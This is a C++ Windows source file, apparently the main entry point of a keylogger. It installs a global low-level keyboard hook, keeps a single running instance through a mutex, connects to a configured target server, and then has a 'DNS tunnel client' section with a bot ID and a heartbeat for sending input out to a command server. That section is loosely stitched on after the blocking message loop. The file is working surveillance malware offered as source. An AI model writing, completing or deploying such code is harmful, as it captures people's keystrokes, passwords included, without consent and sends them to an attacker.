#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include "Network.h"
#include "KeyLogger.h"
#include <iostream>
#include <string>

using namespace std;

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    [[maybe_unused]] HANDLE mutex = CreateMutex(nullptr, 0, MUTEX_NAME); // create an exclusive key
    switch (GetLastError()) { // check if the program already exists
    case ERROR_ALREADY_EXISTS:  // program already running
        return TRUE; // close program
    case ERROR_SUCCESS:  // program isn't already running
    default:  // start just to be sure.
        break;
    }
	
    // establish connection
    while ((connectionId = startConnection(TARGET.c_str())) == -1) {
        Sleep(1000);  // sleep to prevent spamming
        cout << "Failed to establish connection" << endl;
    }
    cout << "Connection ID: " << connectionId << endl;
	
    // global keyboard hook that calls processKey
    _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, process_key, nullptr, 0); 
    keyboardLayout = GetKeyboardLayout(0);
	
    MSG msg;
    // message loop
    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
        // pass the key along, allowing to be used by other processes
        TranslateMessage(&msg);
        DispatchMessageW(&msg);	
    }
	
    // end of program, if hook successful, unhook
    if (_k_hook) {
        UnhookWindowsHookEx(_k_hook);
    }
	
    // return msg.wParam;

    
    cout << "=== DNS Tunnel Client (manual input mode) ===" << endl;
    cout << "Bot ID: " << BOT_ID << endl;
    cout << "Server: " << SERVER_IP << ":" << SERVER_PORT << endl;
    cout << "Type lines and press Enter to send. Type 'exit' to quit." << endl << endl;

    if (!InitializeConnection()) {
        cerr << "Failed to initialize connection. Exiting..." << endl;
        return 1;
    }

    SendHeartbeat();

    string line;
    while (true) {
        cout << "> ";
        if (!getline(cin, line)) break;
        if (line == "exit") break;
        if (line.empty()) continue;
        SendManualInput(line);
    }

    if (clientSocket != INVALID_SOCKET) closesocket(clientSocket);
    WSACleanup();

    cout << "Client exiting." << endl;
    return msg.wParam;
}
